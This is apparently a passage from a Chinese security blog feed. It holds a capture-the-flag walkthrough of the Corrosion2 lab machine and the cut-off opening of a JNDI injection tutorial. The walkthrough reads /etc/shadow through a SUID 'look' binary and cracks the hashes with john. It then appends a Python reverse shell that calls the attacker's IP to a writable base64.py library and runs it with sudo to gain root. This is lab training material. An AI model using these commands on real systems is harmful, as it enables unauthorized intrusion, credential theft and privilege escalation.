class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">jaye@corrosion:~$ ls -al    <br>ls -al<br>total 84<br>drwxr-x--x 18 jaye jaye 4096 Sep 17  2021 .<br>drwxr-xr-x  4 root root 4096 Sep 17  2021 ..<br>-rw-r--r--  1 root root    0 Sep 17  2021 .bash_history<br>-rw-r--r--  1 jaye jaye  220 Feb 25  2020 .bash_logout<br>-rw-r--r--  1 jaye jaye 3771 Feb 25  2020 .bashrc<br>drwx------ 13 jaye jaye 4096 Apr 29 21:20 .cache<br>drwx------ 11 jaye jaye 4096 Sep 17  2021 .config<br>drwxr-xr-x  2 jaye jaye 4096 Sep 17  2021 Desktop<br>drwxr-xr-x  2 jaye jaye 4096 Sep 17  2021 Documents<br>drwxr-xr-x  2 jaye jaye 4096 Sep 17  2021 Downloads<br>drwxr-xr-x  2 root root 4096 Sep 17  2021 Files<br>drwx------  3 jaye jaye 4096 Sep 17  2021 .gnupg<br>drwxr-xr-x  3 jaye jaye 4096 Sep 17  2021 .local<br>drwx------  5 jaye jaye 4096 Sep 17  2021 .mozilla<br>drwxr-xr-x  2 jaye jaye 4096 Sep 17  2021 Music<br>drwxr-xr-x  2 jaye jaye 4096 Sep 17  2021 Pictures<br>-rw-r--r--  1 jaye jaye  807 Feb 25  2020 .profile<br>drwxr-xr-x  2 jaye jaye 4096 Sep 17  2021 Public<br>drwx------  3 jaye jaye 4096 Sep 17  2021 snap<br>drwx------  2 jaye jaye 4096 Sep 17  2021 .ssh<br>drwxr-xr-x  2 jaye jaye 4096 Sep 17  2021 Templates<br>drwxr-xr-x  2 jaye jaye 4096 Sep 17  2021 Videos<br><br></code></pre></td></tr></table></figure><p>SUID 有个 jaye 的 suid 程序 &#x2F;home&#x2F;jaye&#x2F;Files&#x2F;look：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell">jaye@corrosion:~$ find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; &gt; jaye_suid.txt<br>jaye@corrosion:~$ cat jaye_suid.txt                                                <br>cat jaye_suid.txt<br>-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/2128/bin/mount<br>-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2128/bin/ping<br>-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/2128/bin/su<br>-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/2128/bin/umount<br>-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/2128/usr/bin/chfn<br>-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/2128/usr/bin/chsh<br>-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/2128/usr/bin/gpasswd<br>-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/2128/usr/bin/newgrp<br>-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/2128/usr/bin/passwd<br>-rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/2128/usr/bin/sudo<br>-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/2128/usr/lib/openssh/ssh-keysign<br>-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/2721/bin/mount<br>-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2721/bin/ping<br>-rwsr-xr-x 1 root root 44664 Nov 29 05:25 /snap/core18/2721/bin/su<br>-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/2721/bin/umount<br>-rwsr-xr-x 1 root root 76496 Nov 29 05:25 /snap/core18/2721/usr/bin/chfn<br>-rwsr-xr-x 1 root root 44528 Nov 29 05:25 /snap/core18/2721/usr/bin/chsh<br>-rwsr-xr-x 1 root root 75824 Nov 29 05:25 /snap/core18/2721/usr/bin/gpasswd<br>-rwsr-xr-x 1 root root 40344 Nov 29 05:25 /snap/core18/2721/usr/bin/newgrp<br>-rwsr-xr-x 1 root root 59640 Nov 29 05:25 /snap/core18/2721/usr/bin/passwd<br>-rwsr-xr-x 1 root root 149080 Jan 16 07:40 /snap/core18/2721/usr/bin/sudo<br>-rwsr-xr-- 1 root systemd-resolve 42992 Oct 25  2022 /snap/core18/2721/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x 1 root root 436552 Mar 30  2022 /snap/core18/2721/usr/lib/openssh/ssh-keysign<br>-rwsr-xr-x 1 root root 131832 Mar 29 03:47 /snap/snapd/18933/usr/lib/snapd/snap-confine<br>---s--s--x 1 root root 14728 Sep 17  2021 /home/jaye/Files/look<br>-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo<br>-rwsr-xr-x 1 root root 55528 Jul 21  2020 /usr/bin/mount<br>-rwsr-xr-x 1 root root 67816 Jul 21  2020 /usr/bin/su<br>-rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd<br>-rwsr-xr-x 1 root root 53040 Jul 14  2021 /usr/bin/chsh<br>-rwsr-xr-x 1 root root 39144 Jul 21  2020 /usr/bin/umount<br>-rwsr-xr-x 1 root root 85064 Jul 14  2021 /usr/bin/chfn<br>-rwsr-xr-x 1 root root 44784 Jul 14  2021 /usr/bin/newgrp<br>-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount<br>-rwsr-xr-x 1 root root 88464 Jul 14  2021 /usr/bin/gpasswd<br>-rwsr-xr-x 1 root root 14728 Mar 17  2021 /usr/bin/vmware-user-suid-wrapper<br>-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec<br>-rwsr-xr-- 1 root dip 395144 Jul 23  2020 /usr/sbin/pppd<br>-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device<br>-rwsr-xr-x 1 root root 473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign<br>-rwsr-sr-x 1 root root 14488 Jul  6  2021 /usr/lib/xorg/Xorg.wrap<br>-rwsr-xr-x 1 root root 130408 Mar 26  2021 /usr/lib/snapd/snap-confine<br>-rwsr-xr-x 1 root root 22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1<br></code></pre></td></tr></table></figure><p>其他的信息没啥用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">jaye@corrosion:~$ sudo -l<br>sudo -l<br>[sudo] password for jaye: melehifokivai<br><br>Sorry, user jaye may not run sudo on corrosion.<br>jaye@corrosion:~$ getcap -r / 2&gt;/dev/null<br>getcap -r / 2&gt;/dev/null<br>/usr/bin/ping = cap_net_raw+ep<br>/usr/bin/traceroute6.iputils = cap_net_raw+ep<br>/usr/bin/mtr-packet = cap_net_raw+ep<br>/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep<br>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep<br></code></pre></td></tr></table></figure><h3 id="SUID-look-amp-破解shadow密码"><a href="#SUID-look-amp-破解shadow密码" class="headerlink" title="SUID_look &amp; 破解shadow密码"></a>SUID_look &amp; 破解shadow密码</h3><p>那么主要就是 <code> /home/jaye/Files/look</code> 程序，找一下 look suid 的利用方法：</p><p><a href="https://gtfobins.github.io/gtfobins/look/#suid">https://gtfobins.github.io/gtfobins/look/#suid</a></p><p>主要是用来特权读取，也就是以 root 身份去读取文件：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230430163907626.png" alt="image-20230430163907626"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">LFILE=要读取的文件<br>./look &#x27;&#x27; &quot;$LFILE&quot;<br></code></pre></td></tr></table></figure><p>只能读取文件 ~</p><p>那么就只能去读取 &#x2F;etc&#x2F;shadow 的密码，然后进行破解。</p><p>破解 Linux 密码流程：</p><ol><li>读取 <code>/etc/passwd</code>，<code>/etc/shadow </code> 文件</li><li>使用 unshadow 提取密码散列</li><li>使用 john  破解密码</li></ol><blockquote><p>那么就先读取 <code>/etc/passwd</code>，<code>/etc/shadow </code> 文件</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">读取 /etc/passwd</span><br>jaye@corrosion:/tmp$ LFILE=/etc/passwd<br>LFILE=/etc/passwd<br>jaye@corrosion:/tmp$ /home/jaye/Files/look &#x27;&#x27; &quot;$LFILE&quot; &gt; passwd<br>/home/jaye/Files/look &#x27;&#x27; &quot;$LFILE&quot; &gt; passwd<br><span class="hljs-meta prompt_"># </span><span class="language-bash">读取 /etc/shadow</span><br>jaye@corrosion:/tmp$ LFILE=/etc/shadow<br>LFILE=/etc/shadow<br>jaye@corrosion:/tmp$ /home/jaye/Files/look &#x27;&#x27; &quot;$LFILE&quot; &gt; shadow<br>/home/jaye/Files/look &#x27;&#x27; &quot;$LFILE&quot; &gt; shadow<br></code></pre></td></tr></table></figure><p>在哥斯拉里面下载下来，放到 KALI 里面。</p><blockquote><p>提取密码散列：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# unshadow passwd shadow &gt; linux_hashes.txt <br>Created directory: /root/.john<br></code></pre></td></tr></table></figure><blockquote><p>破解Linux用户密码：这里需要好几个小时</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# john --wordlist=/usr/share/wordlists/rockyou.txt linux_hashes.txt<br>Warning: detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;HMAC-SHA256&quot;<br>Use the &quot;--format=HMAC-SHA256&quot; option to force loading these as that type instead<br>Using default input encoding: UTF-8<br>Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 XOP 2x])<br>Cost 1 (iteration count) is 5000 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>...<br>07051986randy    (randy)     <br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">07051986randy<br></code></pre></td></tr></table></figure><blockquote><p>登录</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ ssh randy@192.168.222.145<br>The authenticity of host &#x27;192.168.222.145 (192.168.222.145)&#x27; can&#x27;t be established.<br>ED25519 key fingerprint is SHA256:zKtKAXyhL0euYM1nLav6ZWVRGZ4c2NxUZ+mMIU3VImg.<br>This key is not known by any other names.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;192.168.222.145&#x27; (ED25519) to the list of known hosts.<br>randy@192.168.222.145&#x27;s password: <br>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>439 updates can be applied immediately.<br>329 of these updates are standard security updates.<br>To see these additional updates run: apt list --upgradable<br><br>randy@corrosion:~$ <br></code></pre></td></tr></table></figure><h3 id="SUDO提权"><a href="#SUDO提权" class="headerlink" title="SUDO提权"></a>SUDO提权</h3><blockquote><p>SUID - 无</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:/tmp$ find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; &gt; suid_randy.txt<br>randy@corrosion:/tmp$ cat suid_randy.txt <br>-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/2128/bin/mount<br>-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2128/bin/ping<br>-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/2128/bin/su<br>-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/2128/bin/umount<br>-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/2128/usr/bin/chfn<br>-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/2128/usr/bin/chsh<br>-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/2128/usr/bin/gpasswd<br>-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/2128/usr/bin/newgrp<br>-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/2128/usr/bin/passwd<br>-rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/2128/usr/bin/sudo<br>-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/2128/usr/lib/openssh/ssh-keysign<br>-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/2721/bin/mount<br>-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2721/bin/ping<br>-rwsr-xr-x 1 root root 44664 Nov 29 05:25 /snap/core18/2721/bin/su<br>-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/2721/bin/umount<br>-rwsr-xr-x 1 root root 76496 Nov 29 05:25 /snap/core18/2721/usr/bin/chfn<br>-rwsr-xr-x 1 root root 44528 Nov 29 05:25 /snap/core18/2721/usr/bin/chsh<br>-rwsr-xr-x 1 root root 75824 Nov 29 05:25 /snap/core18/2721/usr/bin/gpasswd<br>-rwsr-xr-x 1 root root 40344 Nov 29 05:25 /snap/core18/2721/usr/bin/newgrp<br>-rwsr-xr-x 1 root root 59640 Nov 29 05:25 /snap/core18/2721/usr/bin/passwd<br>-rwsr-xr-x 1 root root 149080 Jan 16 07:40 /snap/core18/2721/usr/bin/sudo<br>-rwsr-xr-- 1 root systemd-resolve 42992 Oct 25  2022 /snap/core18/2721/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x 1 root root 436552 Mar 30  2022 /snap/core18/2721/usr/lib/openssh/ssh-keysign<br>-rwsr-xr-x 1 root root 131832 Mar 29 03:47 /snap/snapd/18933/usr/lib/snapd/snap-confine<br>-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo<br>-rwsr-xr-x 1 root root 55528 Jul 21  2020 /usr/bin/mount<br>-rwsr-xr-x 1 root root 67816 Jul 21  2020 /usr/bin/su<br>-rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd<br>-rwsr-xr-x 1 root root 53040 Jul 14  2021 /usr/bin/chsh<br>-rwsr-xr-x 1 root root 39144 Jul 21  2020 /usr/bin/umount<br>-rwsr-xr-x 1 root root 85064 Jul 14  2021 /usr/bin/chfn<br>-rwsr-xr-x 1 root root 44784 Jul 14  2021 /usr/bin/newgrp<br>-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount<br>-rwsr-xr-x 1 root root 88464 Jul 14  2021 /usr/bin/gpasswd<br>-rwsr-xr-x 1 root root 14728 Mar 17  2021 /usr/bin/vmware-user-suid-wrapper<br>-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec<br>-rwsr-xr-- 1 root dip 395144 Jul 23  2020 /usr/sbin/pppd<br>-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device<br>-rwsr-xr-x 1 root root 473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign<br>-rwsr-sr-x 1 root root 14488 Jul  6  2021 /usr/lib/xorg/Xorg.wrap<br>-rwsr-xr-x 1 root root 130408 Mar 26  2021 /usr/lib/snapd/snap-confine<br>-rwsr-xr-x 1 root root 22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1<br><br></code></pre></td></tr></table></figure><blockquote><p>SUDO </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:/tmp$ sudo -l<br>[sudo] password for randy: <br>Matching Defaults entries for randy on corrosion:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User randy may run the following commands on corrosion:<br>    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py<br></code></pre></td></tr></table></figure><p>可以去sudo执行 &#x2F;usr&#x2F;bin&#x2F;python3.8 &#x2F;home&#x2F;randy&#x2F;randombase64.py</p><p>看下能否修改 randombase64.py - 不行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:/tmp$ ls -l /home/randy/randombase64.py<br>-rwxr-xr-x 1 root root 210 Sep 20  2021 /home/randy/randombase64.py<br></code></pre></td></tr></table></figure><p>查看 randombase64.py 内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter your string: &quot;</span>)<br>message_bytes = message.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>base64_bytes = base64.b64encode(message_bytes)<br>base64_message = base64_bytes.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(base64_message)<br></code></pre></td></tr></table></figure><p>调用了 bash64 库，那么看 base64 库文件能否修改？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">寻找 base64.py</span><br>randy@corrosion:/tmp$ locate base64.py<br>/home/randy/randombase64.py<br>/snap/core18/2128/usr/lib/python3.6/base64.py<br>/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py<br>/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py<br>/usr/lib/python3.8/base64.py<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看权限 , 可以修改</span><br>randy@corrosion:/tmp$ ls -l /usr/lib/python3.8/base64.py<br>-rwxrwxrwx 1 root root 20386 Sep 20  2021 /usr/lib/python3.8/base64.py<br></code></pre></td></tr></table></figure><p>找一下 Python 的反弹 shell 脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.222.128&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>代码就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;192.168.222.128&quot;</span>,<span class="hljs-number">9999</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>);os.dup2(s.fileno(),<span class="hljs-number">2</span>);<span class="hljs-keyword">import</span> pty; pty.spawn(<span class="hljs-string">&quot;bash&quot;</span>)<br></code></pre></td></tr></table></figure><p>添加到 base64.py：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:/tmp$ echo &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.222.128&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)&#x27; &gt;&gt; /usr/lib/python3.8/base64.py<br></code></pre></td></tr></table></figure><p>kali 监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ nc -lvnp 9999<br>listening on [any] 9999 ...<br></code></pre></td></tr></table></figure><p>sudo 执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:/tmp$ nohup sudo /usr/bin/python3.8 /home/randy/randombase64.py &amp;<br>[1] 71519<br>randy@corrosion:/tmp$ nohup: ignoring input and appending output to &#x27;nohup.out&#x27;<br></code></pre></td></tr></table></figure><p>获取 root shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ nc -lvnp 9999<br>listening on [any] 9999 ...<br>connect to [192.168.222.128] from (UNKNOWN) [192.168.222.145] 56582<br>root@corrosion:/tmp# cd ~<br>cd ~<br>root@corrosion:~# ls<br>ls<br>root.txt  snap<br>root@corrosion:~# cat root.txt<br>cat root.txt<br>2fdbf8d4f894292361d6c72c8e833a4b<br></code></pre></td></tr></table></figure><h2 id="靶机小结"><a href="#靶机小结" class="headerlink" title="靶机小结"></a>靶机小结</h2><ul><li>目录扫描要扫一下敏感文件</li><li>fcrackzip 破解 zip </li><li>suid look</li><li>john 破解 shadow </li><li>修改 sudo py 脚本的调用库完成提权</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]: <a href="https://wiki.xazlsec.com/project-20/doc-650/">https://wiki.xazlsec.com/project-20/doc-650/</a>“靶机渗透06-Corrosion2”<br>[2]: <a href="https://gtfobins.github.io/gtfobins/look/#suid">https://gtfobins.github.io/gtfobins/look/#suid</a>“look suid”<br>[3]: <a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/46.html">https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/46.html</a>“KALI 破解操作系统用户密码”</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶机渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI 注入</title>
    <link href="/2023/05/29/Java%E5%AE%89%E5%85%A8/JNDI%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/05/29/Java%E5%AE%89%E5%85%A8/JNDI%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>JNDI（The Java Naming and Directory Interface）全称是 “Java命名和目录接口”，它是一类给 Java 应用程序提供命名和目录功能的 API 编程接口。</p><p>命名服务：把一个对象作为值跟命名服务上一个特定的名字绑定，可以通过这个名字到命名服务上查询并使用先前绑定的这个对象。</p><p>目录服务：一种特殊的命名服务，特殊在可以通过目录服务来对目录对象进行绑定和查询。目录对象可以将属性和对象相关联，因此，通过目录服务还可以对对象属性进行操作。</p><p>JNDI 对各种目录服务的实现进行抽象和统一化，这些目录服务如下：</p><ul><li>LDAP：轻量级目录访问协议</li><li>RMI：Java 远程方法调用</li><li>DNS：域名服务</li><li>CORBA：公共对象请求 DAILI 体系结构</li></ul><p><code>InitialContext</code> ：用于读取 JNDI 的一些配置信息，内含对象和其在 JNDI 中的注册名称的映射信息</p><p><code>lookup()</code>：根据名字查询绑定的对象</p><p>通过 JND 访问 RMI 服务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span 